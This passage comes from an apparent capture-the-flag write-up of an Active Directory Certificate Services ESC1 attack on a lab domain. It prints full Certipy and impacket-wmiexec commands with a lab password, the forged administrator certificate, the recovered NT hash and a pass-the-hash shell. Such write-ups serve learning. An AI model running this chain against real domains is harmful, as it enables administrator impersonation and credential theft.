- we see that `User Enrollable Principals` contains `t1_admins` group and `Nigel.Mills` also belongs to that group which means we can attempt to perform `ESC1` attack
- we will need to set up `proxychain` to perform this attack since `ADCS` is not accessible externally
- we can exploit `ESC1` by enrolling the vulnerable template as `_admin` user and use it to authenticate to the target 
- getting the `pfx` certificate 
```bash
$ proxychains -q certipy req -u nigel.mills -p Sail2Boat3 -target-ip 10.129.29.136 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin -key-size 4096 -sid S-1-5-21-87560095-894484815-3652015022-500 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN '_admin'
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Saving certificate and private key to '_admin.pfx'
[*] Wrote certificate and private key to '_admin.pfx'
```
- authenticating as `_admin.pfx` 
```bash
$ proxychains -q certipy auth -pfx _admin.pfx -domain shibuya.vl -dc-ip 10.129.29.136
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: '_admin'
[*]     SAN URL SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*]     Security Extension SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Using principal: '_admin@shibuya.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to '_admin.ccache'
[*] Wrote credential cache to '_admin.ccache'
[*] Trying to retrieve NT hash for '_admin'
[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
```
- we get the hash of `_admin` user 
- then get reverse shell as `_admin` user using `impacket-wmiexec`
```bash
$ proxychains -q impacket-wmiexec '_admin@10.129.29.136' -hashes aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
shibuya\_admin
```
#### Resources

#### Lesson Learned
